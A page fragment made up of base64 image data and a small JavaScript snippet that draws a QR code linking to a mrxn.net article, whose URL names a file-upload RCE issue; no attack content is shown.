2P83ohPvfVdUhevfs6h9FvnQjJA9f3kNubvbafsvpUO3ffXYdMt+udW98RUt/1FbcvrOvOPOZdA8Ze5iG6XL9chNEH4fpF/Ste+vU9pE7hjeLwPaRPETJtdQg/ew8QHwSt//j4+PxoFaLbB8JhRPMd7df14pAedV0Bj3nvBfF3vXrtA57zrfpA6vc9rydkfxpvcL0NZDVF9wiZ5soHyevXJ6pDfF1fcYi/10N0uKMee4nq4pl+lrePCPc9AMobAp//uAKCW+L3hesVbgP5nbvgxSew/ZQF59OrCcLoK62ivw8YfT3fOcRfvSrO8uWp6L7ikF51/Z2AeT3M9drHPvqa5lY6pC9w/R5ye7PX6ZcsuE8P+PwJqSYO0c/eD8QHQf0QXr0q1EUY8+WpOMvvPXrPELIWBKtHhXUQXS6WpwKSh2BpFfrE0irkEL+88HQgZbri507gMBDI1CDoVmqyFRC9rivO8uWp6D65WJ6KziHrqcPI1QshuepTASMvraK8+yitYq/trytXsdf215WrUINx3a7Lq6ZCXngYSIlXvO4ElgOpyVX0rZVWAbkLIKivchUQHYLmIbw8FV2Xr7BqKnr+KxyyBwj2Wpjr+iB5GLH2VaHvDCH1VWMsB3LW7Mr/mxPYBuKEXAbG6UE4BPWL1onqYtflMPaDcAh2n/wRwtdqYfS7Z4gOQfW+9krvvhWH9Aeu30Nub/banhDIlNzfaurqED8EresIyfe6M59+UT/M+wFaDth7nHHg829P+kQY9cNCTYD4le2z4qVvAylyxetP4DCQPsW+RRin3vNn3P6QPnLRekhebl5c6eYL9UB6wYg9L/9bWHuogKxrXwiHoHrhYSAlXvG6EzgMBDI1CLq1mvQ+ui6H1EHQGgjXt9Jh9EE4jGgfuOtqK3TNjvpXes/LzxCyN/vq71y98DCQEq943Qlsn6n3LaymCJl693e+qu++Z3nvB8d9QDQIWiM+uxak/nZLBTzHYfSl+vb5Extw8wV8arN9XU+Ip/QmuH1i6LTE1f7Mi5Bp6+86jHl9z2LvZ536DPV0hOwFRuw+e0J8q/xKt17UB+nXdfOF1xNSp/BGsX0PgUwPnsOz99Dvgs6tV4esKxdh1K0TIXlA6YDA59dsE/YW1UWI/0/z9usI6d/14tcTUqfwRrENxLvhDM/2Dpk+BO1nHUSHEXteLkL8ctH+hWodK7ePnpfDfI1n8/pcS97xUX4bSC+6+GtO4DAQyF0CI66292jaq5q9flZvXrQWxv3Bna88XZd37GuZVxcha5qHcBjRvHVyUb3wMBBNF77mBP7aQCB3RU25or8dSF69PBUQva4rzHeE0Vfeiu7b88pXqMHYA0Ze3gr9YmkVEH/XK1ehLpZWIYfUy2f41wYya35pXz+BPx4IPJ46zPMw6hBed1RFfyulVaz0fa6uK1ZemK8F0XvdV3mtXbGqg3EdCAeuz9Rvb/Y6PCE12Vms9t29+rou73l5R8hdow7hsEbXgHisFSF698Fc73XP8u5zvY769vphIJoufM0JbAOB3CXwGFfbhO/V7e+Ouu79IX0rV2G+rivkhfDYW/4KiK9qvhJVuw9r1eQrhPm6EB24vofc3uy1PSFvtq//2+38DwAA//8xSlwuAAAABklEQVQDAPWWX61rANd3AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-file-uploadMapServerBgImage-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 